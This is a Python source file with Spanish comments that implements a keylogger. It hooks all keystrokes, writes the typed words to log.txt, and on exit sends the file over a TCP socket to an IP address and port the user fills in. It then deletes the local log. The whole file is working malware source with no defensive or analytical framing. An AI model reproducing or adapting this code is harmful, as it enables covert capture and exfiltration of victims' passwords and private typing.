#Librerias 
import keyboard
import sys
import socket
import os

#Variables
word = ""

#Funcion de captura de teclas 
def pulso_key(pulso):
    global word 

    if pulso.event_type == keyboard.KEY_DOWN:
        if pulso.name == "space":
            save_word()
        elif len(pulso.name) == 1 and pulso.name.isprintable():
           word += pulso.name

#Captura de teclas
keyboard.hook(pulso_key)

#Guardar la palabra en un archivo
def save_word():
    with open("log.txt", "a") as file:
        file.write(word + "\n")
    print("Palabra guardada:", word)
    reset_word()

#envio de datos mediante socket
def send_data(file_path, dir_ip, port_num):
    try:
        with open(file_path, 'rb') as file:
            contenido = file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((dir_ip, port_num))
             s.sendall(contenido)
             os.remove(file_path)
             sys.exit()

    except Exception as e:
        print("Error al enviar datos:", e)

def Stop_script():
    print("Programa terminado...")
    keyboard.unhook_all()
    send_data(file_path, dir_ip, port_num)

#Envio de datos mediante socket 
dir_ip = "0.0.0.0"  #<=Aqui se debe colocar la direccion IP a donde se va enviar los datos
port_num = 0       #<=Aqui se debe colocar el puerto a donde se va enviar los datos
file_path = "log.txt"

#Actualizar la variable word a una cadena vacía
def reset_word():
    global word
    word = ""

#Detener el programa con Ctrl+C
try:
    keyboard.wait("esc")
    Stop_script()
except KeyboardInterrupt:
    print("Programa terminado...")
    pass


